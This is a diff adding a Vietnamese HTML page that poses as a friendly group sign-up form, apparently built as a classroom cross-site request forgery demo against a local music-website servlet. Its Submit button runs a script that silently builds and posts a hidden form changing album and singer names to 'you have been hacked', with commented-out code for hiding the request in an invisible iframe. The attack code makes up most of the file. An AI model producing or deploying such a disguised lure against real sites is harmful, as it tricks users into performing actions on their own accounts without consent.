@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Điền thông tin để lập nhóm</title>
+</head>
+<body>
+    <h1>Điền vô đi bạn （づ￣3￣）づ╭❤️～</h1>
+    <h1>Điền thông tin để lập nhóm</h1>
+    <label for="firstName">First Name:</label>
+<input type="text" id="firstName" name="firstName" required><br>
+
+<label for="lastName">Last Name:</label>
+<input type="text" id="lastName" name="lastName" required><br>
+
+<label for="lastName">Major:</label>
+<input type="text" id="lastName" name="lastName" required><br>
+
+<label for="age">Age:</label>
+<input type="number" id="age" name="age" required><br>
+
+
+    <script>
+        function csrfAttack() {
+            var form = document.createElement("form");
+            form.setAttribute("method", "POST");
+            form.setAttribute("action", "http://localhost:8080/Music_webstite/AlbumServlet"); // Điền URL đến trang xử lý biểu mẫu AlbumServlet ở đây
+
+            var albumNameInput = document.createElement("input");
+            albumNameInput.setAttribute("type", "hidden");
+            albumNameInput.setAttribute("name", "albumname");
+            albumNameInput.setAttribute("value", "Ban da bi hack");
+
+            var singerNameInput = document.createElement("input");
+            singerNameInput.setAttribute("type", "hidden");
+            singerNameInput.setAttribute("name", "singername");
+            singerNameInput.setAttribute("value", "Ban da bi hack");
+
+            // var csrfTokenInput = document.createElement("input");
+            // csrfTokenInput.setAttribute("type", "hidden");
+            // csrfTokenInput.setAttribute("name", "csrfToken");
+            // csrfTokenInput.setAttribute("value", "malicious-csrf-token"); // Điền CSRF token độc hại ở đây
+
+            form.appendChild(albumNameInput);
+            form.appendChild(singerNameInput);
+            // form.appendChild(csrfTokenInput);
+
+            // Tạo iframe ẩn và đặt tên cho nó
+    // var iframe = document.createElement("iframe");
+    // iframe.setAttribute("name", "hiddenFrame");
+    // iframe.style.display = "none";
+
+    // Thêm iframe vào trang
+    // document.body.appendChild(iframe);
+
+    // Đặt thuộc tính target của form thành tên iframe
+    // form.setAttribute("target", "hiddenFrame");
+
+    // Thêm form vào trang
+    document.body.appendChild(form);
+
+    // Submit form
+    form.submit();
+
+    // Hiển thị thông điệp cảm ơn sau khi submit
+    // var thankYouMessage = document.createElement("h2");
+    // thankYouMessage.textContent = "Cảm ơn bạn đã điền thông tin!";
+    // document.body.appendChild(thankYouMessage);
+}
+        
+    </script>
+
+    <button onclick="csrfAttack()">Submit</button>
+</body>
+</html>
